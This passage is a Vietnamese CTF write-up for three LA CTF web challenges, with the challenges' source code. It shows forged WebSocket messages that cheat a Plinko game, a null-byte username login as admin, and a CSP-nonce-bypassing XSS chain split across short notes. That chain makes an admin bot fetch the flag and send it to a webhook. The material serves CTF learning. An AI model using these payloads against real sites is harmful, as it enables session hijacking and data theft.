            return;
        }
        const msgType = msgData.msgType;

        // user dropped a ball
        if (msgType=='join') {
            if (msgData.ballPos.x!=500) {
                socketSend(ws, JSON.stringify({error: "Stop cheating"}), () => ws.close());
               
            }
            prevCollision = msgData.ballPos;
            prevVelo = msgData.ballVelo;
            prevTime = msgData.time;
            if (!req.session.user || !req.session['user'] || !(users[req.session['user']])) {
                socketSend(ws, JSON.stringify({error: "Not logged in"}), () => ws.close());
            }
            else  {
                if (users[req.session['user']].points<100) {
                    socketSend(ws, JSON.stringify({error: "Not enough money"}), () => ws.close());
                }
                socketSend(ws, JSON.stringify({ message: 'Welcome to the Plinko game!' }));
                users[req.session['user']].points-=100;
            }
            return;
        }

        const ballPos = msgData.position;
        const pinPos = msgData.obsPosition;
        const initialV = msgData.velocity;
        const time = msgData.time;
        if (!ballPos || !pinPos || !initialV || !req.session['user'] || !(users[req.session['user']])) {
            return;
        }
        // validating your given trajectory
        let result = validatePosition(prevCollision, prevVelo, prevTime, ballPos, initialV, time);

        // checking that you're actually hitting an obstacle
        if (Matter.Vector.magnitude(Matter.Vector.sub(ballPos, pinPos))>15) {
            // check if it's hitting a wall or the ground
            let hitting = hittingWall(ballPos);
            if (hitting==false && pinPos.y!=1000) result = false;

        }
        // check that there's really an obstacle in the place you said
        if (!pinPositions.find(position => position.x===pinPos.x && position.y===pinPos.y)) result = false;

        // you cheated
        if (!result) {
            socketSend(ws, JSON.stringify({"error": "Stop cheating!!"}), () => ws.close());
            return;
        }

        if (pinPos.x==500 && pinPos.y==1000) {
            // ground
            let index = Math.floor(ballPos.x/(1000/19));
            if (index<0) index=0;
            if (index>=multipliers.length) index = multipliers.length-1;
            let points = multipliers[index]*100;
            users[req.session['user']].points +=points;
            if (users[req.session['user']].points>10000) socketSend(ws, points+flag, () => ws.close());
            else socketSend(ws, points, () => ws.close());
        }

        let normal;
        if (pinPos.x==190 && pinPos.y==480) {
            // left wall
            normal = Matter.Vector.create(1, -0.38142587779);
        }
        else if (pinPos.x==810 && pinPos.y==480) {
            // right wall
            normal = Matter.Vector.create(1, 0.38142587779);
        }
        else {
            normal = Matter.Vector.sub(ballPos, pinPos);
        }
        normal = Matter.Vector.normalise(normal);

        // Compute the normal component of velocity
        let dotProduct = Matter.Vector.dot(initialV, normal);
        let vNormal = Matter.Vector.mult(normal, dotProduct);

        let vTangent = Matter.Vector.sub(initialV, vNormal);

        let vNormalReflected = Matter.Vector.neg(vNormal);
        let resultantVelocity = Matter.Vector.mult(Matter.Vector.add(vTangent, vNormalReflected), 0.6);
        resultantVelocity = Matter.Vector.rotate(resultantVelocity, Math.random()*0.32-0.16);

        prevCollision = ballPos;
        prevVelo = resultantVelocity;
        prevTime = time;
        // send the resultant velocity of the collision
        socketSend(ws, JSON.stringify(resultantVelocity))
    });

    // Send a welcome message to the client

  } catch (error) {
    ws.close();
  }
});
app.get("/", (req, res) => {
    if (!req.session || !req.session.user || !(req.session.user in users)) {
        return res.redirect("/login"); 
    }
    fs.readFile(path.join(__dirname, "public", "index.html"), "utf8", (err, data) => {
        const money = users[req.session.user].points || 0; // Default to 0 if user not found
        const filledHtml = data.replace("{{money}}", money);
        res.send(filledHtml);
    });
});
app.get("/signup", (req, res) => res.sendFile(path.join(__dirname, "public", "signup.html")));
app.get("/login", (req, res) => res.sendFile(path.join(__dirname, "public", "login.html")));

app.server = app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});

// Attach WebSocket server to Express server
app.server.on('upgrade', (request, socket, head) => {
    sessionMiddleware(request, {}, () => {
        wss.handleUpgrade(request, socket, head, (ws) => {
            wss.emit('connection', ws, request);
        });
    });
});
```

Phân tích : 

* Web sẽ cho ta flag nếu đạt được hơn 10000 điểm khi chơi game

* Web sẽ sử dụng websocket để liên kết client và server và đưa các thông tin về viên bi đang rơi ở vị trí nào, vận tốc ra sao, sau đó web sẽ tính toán và render ra cho người dùng 

![image](https://hackmd.io/_uploads/ByhkvJ9FJx.png)

* Ví dụ về một request socket về collision bao gồm velocity là vận tốc, position là vị trí viên bi, obsPosition là khung mà viên bi được rơi trong đó, time là thời gian rơi xuống của viên bi

![image](https://hackmd.io/_uploads/rJ0-wyqKJg.png)

* Sau khi đọc source thì mình thấy khi bắt đầu game viên bi phải có tọa độ x là 500/1000 có nghĩa là ở giữa nếu không sẽ trả ra Stop cheating

```js
if (msgType=='join') {
    if (msgData.ballPos.x!=500) {
        socketSend(ws, JSON.stringify({error: "Stop cheating"}), () => ws.close());

    }
    prevCollision = msgData.ballPos;
    prevVelo = msgData.ballVelo;
    prevTime = msgData.time;
    if (!req.session.user || !req.session['user'] || !(users[req.session['user']])) {
        socketSend(ws, JSON.stringify({error: "Not logged in"}), () => ws.close());
    }
    else  {
        if (users[req.session['user']].points<100) {
            socketSend(ws, JSON.stringify({error: "Not enough money"}), () => ws.close());
        }
        socketSend(ws, JSON.stringify({ message: 'Welcome to the Plinko game!' }));
        users[req.session['user']].points-=100;
    }
    return;
}
```

Lúc này thì mình chỉ cần đặt viên bi ở giữa rồi dịch chuyển đến đích là xong : 

```json
{
    "msgType": "join",
    "ballPos": {
        "x": 500,
        "y": 1000
    },
    "ballVelo": {
        "x": 0,
        "y": 0
    },
    "time": 0
}
```

Và dịch chuyển đến (0, 1000) là ta sẽ được x10 điểm

```json
{
    "msgType":"collision",
    "velocity":{
        "x":0,
        "y":0
    },
    "position":{
        "x":0,
        "y":1000
    },
    "obsPosition":{
        "x":500,
        "y":1000
    },
    "time":0
}
```

Sau khi request 2 cái trên thì mình có thêm 1000 điểm

![image](https://hackmd.io/_uploads/ByRY9kqYyx.png)

Thực hiện 10 lần thì ta có hơn 10000 điểm và ta có flag 

![image](https://hackmd.io/_uploads/ryX7CZFYkx.png)

`Flag: lactf{mY_b4Ll_w3Nt_P1iNk_pL0Nk_4nD_n0W_1m_br0K3}`


## arclbroth

![image](https://hackmd.io/_uploads/Bk2AKck91e.png)

### Source

https://drive.google.com/file/d/1okK_T77IT31JBHVf1GqQHqKiH9-A6K_5/view?usp=sharing

### Hints

Null Byte Injection

### Solution

Challenge cho ta một trang web sau 

![image](https://hackmd.io/_uploads/rk2Qn1cYJl.png)

Mình thử đăng nhập và web cho mình 10 con arcs 

![Screenshot_2025-02-12_16-40-46](https://hackmd.io/_uploads/ByGbpy5K1g.jpg)

Mình thử bấm brew broth thì không thấy có gì hot cả nên chuyển sang đọc source

```js
const crypto = require('crypto');
const path = require('path');
const express = require('express');
const cookieParser = require('cookie-parser');
const { init: initDb, sql} = require('secure-sqlite');

const port = process.env.PORT ?? 3000;
const adminpw = process.env.ADMINPW ?? crypto.randomBytes(16).toString('hex');
const flag = process.env.FLAG ?? 'lactf{test_flag_owo}';

initDb(':memory:');
sql`CREATE TABLE users (
  username TEXT PRIMARY KEY,
  password TEXT,
  arcs INT
)`;
sql`CREATE TABLE sessions (id INT PRIMARY KEY, username TEXT)`;
sql`INSERT INTO users VALUES ('admin', ${adminpw}, 100)`;
console.log(sql`SELECT * FROM users`);

const app = express();

app.use('/', express.static(path.join(__dirname, 'site')));

app.use(cookieParser());
app.use(express.json());

app.use((req, res, next) => {
  const sessId = parseInt(req.cookies.session);
  if (!isNaN(sessId)) {
    const sessions = sql`SELECT username FROM sessions WHERE id=${sessId}`;
    if (sessions.length > 0) {
      res.locals.user = sql`SELECT * FROM users WHERE username=${sessions[0].username}`[0];
    }
  }
  next();
});

app.post('/register', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  if (!username || typeof username !== 'string') {
    res.status(400).json({ err: 'provide a username owo' });
    return;
  }

  if (!password || typeof password !== 'string') {
    res.status(400).json({ err: 'provide a password uwu' });
    return;
  }

  const existing = sql`SELECT * FROM users WHERE username=${username}`;
  if (existing.length > 0) {
    res.status(400).json({ err: 'user already exists' });
    return;
  }

  sql`INSERT INTO users VALUES (${username}, ${password}, 10)`;
  const id = crypto.randomInt(281474976710655);
  sql`INSERT INTO sessions VALUES (${id}, ${username})`;
  res
    .cookie('session', id)
    .json({ success: true });
});

app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  if (!username || typeof username !== 'string') {
    res.status(400).json({ err: 'provide a username owo' });
    return;
  }

  if (!password || typeof password !== 'string') {
    res.status(400).json({ err: 'provide a password uwu' });
    return;
  }

  const existing = sql`SELECT * FROM users WHERE username=${username}`;
  if (existing.length == 0 || existing[0].password !== password) {
    res.status(400).json({ err: 'invalid login' });
    return;
  }

  const id = crypto.randomInt(281474976710655);
  sql`INSERT INTO sessions VALUES (${id}, ${username})`;
  res
    .cookie('session', id)
    .json({ success: true });
});

app.post('/brew', (req, res) => {
  if (!res.locals.user) {
    res.status(400).json({ err: 'please login' });
    return;
  }

  const { arcs, username } = res.locals.user;

  if (arcs < 2) {
    res.json({ broth: 'no-arcs', arcs });
  } else if (arcs < 50) {
    sql`UPDATE users SET arcs=${arcs - 2} WHERE username=${username}`;
    res.json({ broth: 'standard', arcs: arcs - 2 });
  } else {
    sql`UPDATE users SET arcs=${arcs - 50} WHERE username=${username}`;
    res.json({ broth: flag, arcs: arcs - 50 });
  }
});

app.post('/replenish', (req, res) => {
  if (!res.locals.user) {
    res.status(400).json({ err: 'please login' });
    return;
  }

  const { username } = res.locals.user;
  const arcs = username === 'admin' ? 100 : 10
  sql`UPDATE users SET arcs=${arcs}`;
  res.json({ success: true, arcs });
});

app.get('/info', (req, res) => {
  res.json(res.locals.user);
});

app.listen(port, () => {
  console.log(`http://0.0.0.0:${port}`);
});
```

Phân tích : 

* flag sẽ hiện ra cho ta nếu như mình có hơn 50 arcs 

```js
if (arcs < 2) {
    res.json({ broth: 'no-arcs', arcs });
} else if (arcs < 50) {
    sql`UPDATE users SET arcs=${arcs - 2} WHERE username=${username}`;
    res.json({ broth: 'standard', arcs: arcs - 2 });
} else {
    sql`UPDATE users SET arcs=${arcs - 50} WHERE username=${username}`;
    res.json({ broth: flag, arcs: arcs - 50 });
}
```

* Web sẽ add vào admin user với hơn 100 arcs 

```sql
sql`CREATE TABLE users (
  username TEXT PRIMARY KEY,
  password TEXT,
  arcs INT
)`;
sql`CREATE TABLE sessions (id INT PRIMARY KEY, username TEXT)`;
sql`INSERT INTO users VALUES ('admin', ${adminpw}, 100)`;
```

* Lúc này mình mới nhận ra là phải thực hiện SQL injection để vào admin

Chúng ta có thể sử dụng username và password như sau và chèn null byte để bypass 

`{"username": "admin\u0000", "password": "password"}`

Sau khi bật intercept thì mình thấy nó sẽ thêm một ký tự thoát như sau nhưng mình có thể chuyển lại thành admin\u0000 như mình mong muốn 

![image](https://hackmd.io/_uploads/SyBmggcKJl.png)

Và mình đã có thể vào admin với 100 con arcs hehe

![image](https://hackmd.io/_uploads/SJU4keqtke.png)

Sau khi bấm brew broth thì mình đã có flag

![image](https://hackmd.io/_uploads/r14SygqKyx.png)


`Flag: lactf{bulri3v3_it_0r_n0t_s3cur3_sqlit3_w4s_n0t_s3cur3}`

## antisocial-media


![image](https://hackmd.io/_uploads/Sy5zOEl5kg.png)

### Source

https://drive.google.com/drive/folders/1YRI5RSRgnkh9i9Qtcq3AISheIJzmZPXA?usp=sharing

### Hints

XSS

### Solution

Challenge cho mình một trang web để add note như sau

![image](https://hackmd.io/_uploads/B129dEeq1e.png)

![image](https://hackmd.io/_uploads/rJ3sdNe5ke.png)

Và một admin bot

![image](https://hackmd.io/_uploads/rJtndNe9kx.png)

VÌ có bot nên mình nghĩ tới các lỗi XSS, CSRF, ... Nhưng sau khi thử các payload mà vẫn không ăn nên mình tiến hành đọc source

```js
const express = require("express");
const session = require("express-session");
const crypto = require("crypto");
const cookieParser = require("cookie-parser");
const fs = require("fs").promises;

const PORT = 3000;
const app = express();
app.use(express.static("public"));
app.use(express.json());
app.use(cookieParser());
app.use(session(
    {
        secret: process.env.SESSION_SECRET || "default",
        resave: true,
        saveUninitialized: true,
        cookie: {
            httpOnly: true,
            sameSite: "lax",
        },
    }
));

app.use((_, res, next) => {
    res.locals.nonce = crypto.randomBytes(32).toString("base64");
    res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${res.locals.nonce}'`);
    next();
});

async function renderTemplate(view, params) {
    const template = await fs.readFile(`views/${view}.html`, { encoding: "utf8" });
    const html = Object.entries(params).reduce(
        (p, [k, v]) => p.replace(new RegExp(`{{${k}}}`, "g"), v),
        template
    );

    if (!params.notes) {
        return html;
    }

    return html.replace(
        "{{...notes}}",
        `[${
            params.notes.map(
                n => `'${n.
                    replace(/'/g, "&apos;").
                    replace(/\n/g, "").
                    replace(/\r/g, "").
                    replace(/\\/g, "\\\\")
                    }'`
            ).join(", ")
        }]`);
}

app.get("/", async (req, res) => {
    if (req.session && req.session.username) {
        res.redirect("/profile");
        return;
    }

    res.send(
        await renderTemplate("index", {
            nonce: res.locals.nonce,
        })
    );
});

app.get("/profile", async (req, res) => {
    if (!req.session || !req.session.username) {
        res.redirect("/");
        return;
    }

    res.send(
        await renderTemplate("profile", {
            nonce: res.locals.nonce,
            username: req.session.username,
            notes: req.session.notes || [],
        })
    );
});

app.post("/api/login", (req, res) => {
    const { username, password } = req.body;

    if (!username || typeof username !== "string" || username.length > 100) {
        res.status(400).send({ success: false });
        return;
    }

    if (!password || typeof password !== "string" || password.length > 100) {
        res.status(400).send({ success: false });
        return;
    }

    req.session.username = username;
    req.session.password = password;
    req.session.notes = [];

    res.send({ success: true });
});

app.post("/api/notes", (req, res) => {
    const { note } = req.body;

    if (!req.session) {
        res.status(401).send({ success: false });
        return;
    }

    if (!note || typeof note !== "string") {
        res.status(400).send({ success: false });
        return;
    }

    if (typeof req.session.notes !== "object" || !Array.isArray(req.session.notes)) {
        req.session.notes = [];
    }

    // We aren't web scale yet! :)
    if (note.length > 15 || req.session.notes.length > 15) {
        res.status(400).send({ success: false });
        return;
    }

    req.session.notes.push(note);

    res.send({ success: true });
});

app.post("/api/logout", (req, res) => {
    if (!req.session) {
        res.status(401).send({ success: false });
        return;
    }

    req.session.destroy();
    res.send({ success: true });
});

app.post("/flag", (req, res) => {
    const ADMIN_PW = process.env.ADMIN_PW || "placeholder";
    const FLAG = process.env.FLAG || "lactf{test_flag}";
    if (req.cookies.secret !== ADMIN_PW) {
        res.status(403).send({ success: false });
        return;
    }

    res.send(FLAG);
});

app.listen(PORT, () => console.log(`Started server at http://localhost:${PORT} ...`));
```

Có thể thấy ngay flag nằm ở endpoint /flag và chỉ có admin bot mới access vào được. Nhưng điều sú nhất nằm ở phần này : 

```js
app.use((_, res, next) => {
    res.locals.nonce = crypto.randomBytes(32).toString("base64");
    res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${res.locals.nonce}'`);
    next();
});

async function renderTemplate(view, params) {
    const template = await fs.readFile(`views/${view}.html`, { encoding: "utf8" });
    const html = Object.entries(params).reduce(
        (p, [k, v]) => p.replace(new RegExp(`{{${k}}}`, "g"), v),
        template
    );

    if (!params.notes) {
        return html;
    }

    return html.replace(
        "{{...notes}}",
        `[${
            params.notes.map(
                n => `'${n.
                    replace(/'/g, "&apos;").
                    replace(/\n/g, "").
                    replace(/\r/g, "").
                    replace(/\\/g, "\\\\")
                    }'`
            ).join(", ")
        }]`);
}
```

Theo như mình đọc writeup thì người ta sử dụng một cái trick của hàm replace để bypass nonce như sau : 

* Hàm replace không chỉ thay đổi như mình hay sử dụng mà mình còn có thể sử dụng kiểu như regex và insert vào theo ý mình muốn như sau

![image](https://hackmd.io/_uploads/HJWyh4l5yg.png)

Ví dụ : ta có thể sử dụng $\` để replace và thêm vào chuỗi đằng trước chuỗi mình cần replace và $' để thêm vào sau

![image](https://hackmd.io/_uploads/Skzdn4xckg.png)

Đến đây thì mình có thể thêm một cái note như sau : 

```html
<script nonce="{{nonce}}">
    const note = ['$`</script>$`;abc//']
```

thì nó sẽ replace thành 

```html
<!-- Output -->
<script nonce="{{nonce}}">
    const note = [' 
<script nonce="{{nonce}}">
    const note = </script> 
<script nonce="{{nonce}}">
    const note = ""; abc//'];
```

Và đoạn 

```html
    const note = [' 
<script nonce="{{nonce}}">
    const note = 
```

sẽ được thực thi

Thêm nữa là vì mỗi note chỉ giới hạn 15 chars 

```js
if (note.length > 15 || req.session.notes.length > 15) {
    res.status(400).send({ success: false });
    return;
}
```

Từ đó mình có thể xây dụng payload sau để chèn vào note và khiến admin fetch flag và đi đến window.name là link webhoook mà mình sẽ gán vào 

```js
const notes = [
  "$`</script>$`/*",
  "*/1;fetch(/*",
  '*/"/flag"/*',
  "*/,{method:/*",
  '*/"post"})./*',
  "*/then(_=>_./*",
  "*/text())./*",
  "*/then(_=>{/*",
  "*/location=/*",
  "*/name+_})//",
];
```

nhưng làm sao để admin bot đi vào trang đang dính xss trên? Ta biết rằng không thể set cookie của admin nên không thể redirect nó tới trang trên. Lúc này thì mình nghĩ ra là sẽ xài web khác để insert js vào và add cookie để redirect

Và mình có payload như sau : 

```js
<script>
const chall = "https://antisocial-media.chall.lac.tf"
const webhook = "https://webhook.site/6f12b62f-17ac-4e07-ba5d-5d01df9ebfa0"
const id = ...
const html = `<img src=x onerror='document.cookie="connect.sid=\${id}; domain=.chall.lac.tf; path=/profile"; window.location="${chall}/profile";'>`;

window.name = "{{webhook}}?";
window.location = "https://purell.chall.lac.tf/level/start?html=" + encodeURIComponent(html);
</script>
```

Trong đó id là connect.sid của trang mình vừa thêm các note XSS vào. Cuối cùng host đoạn script trên và gửi cho admin bot để vào là xong 

Thực hiện đủ các bước thì ta có flag tại webhook

![image](https://hackmd.io/_uploads/HkEOwSeqJg.png)

`Flag: lactf{50_50CiaL_y0u_CaN_57Ill_937_HAx0R3D}`

## gigachessbased

Updating...